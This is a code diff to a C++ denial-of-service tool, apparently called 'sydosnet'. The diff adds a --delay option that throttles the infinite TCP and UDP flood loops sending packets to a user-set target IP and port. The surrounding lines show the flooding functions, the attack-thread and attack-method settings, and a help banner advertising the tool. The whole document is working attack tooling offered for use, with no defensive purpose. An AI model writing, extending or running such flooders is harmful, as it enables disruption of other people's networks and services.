@@ -10,6 +10,7 @@ char target_ip[16]{0};
 int target_port = 0;
 int attack_thread = 0;
 char attack_method[4]{0};
+int attack_delay = 0;
 
 void tcpflood()
 {
@@ -28,6 +29,7 @@ void tcpflood()
 
     while(true) {
         send(sock, packet, sizeof(packet), 0);
+        usleep(attack_delay * 1000);
     }
 }
 
@@ -47,6 +49,7 @@ void udpflood()
 
     while(true) {
         sendto(sock, packet, sizeof(packet), 0, reinterpret_cast<sockaddr*>(&target), sizeof(SOCKADDR_IN));
+        usleep(attack_delay * 1000);
     }
 }
 
@@ -99,6 +102,8 @@ int main(int argc, char** argv)
             std::cout << " |                  --thread  set attack thread               | " << std::endl;
             std::cout << " |                -m,                                         | " << std::endl;
             std::cout << " |                  --method  set attack method               | " << std::endl;
+            std::cout << " |                -d,                                         | " << std::endl;
+            std::cout << " |                  --delay  set attack delay                 | " << std::endl;
             std::cout << " |                                                            | " << std::endl;
             std::cout << " |       Update: https://github.com/seungyup26/sydosnet       | " << std::endl;
             std::cout << " |          API: https://github.com/seungyup26/dosapi         | " << std::endl;
@@ -126,6 +131,12 @@ int main(int argc, char** argv)
         else if(strcmp(argv[i], "-m") == 0 || strcmp(argv[i], "--method") == 0)
         {
             strcpy(attack_method, argv[i+1]);
+        }
+
+        /* Set Attack Delay */
+        else if(strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--delay") == 0)
+        {
+            attack_delay = atoi(argv[i+1]);
         }
     }
 
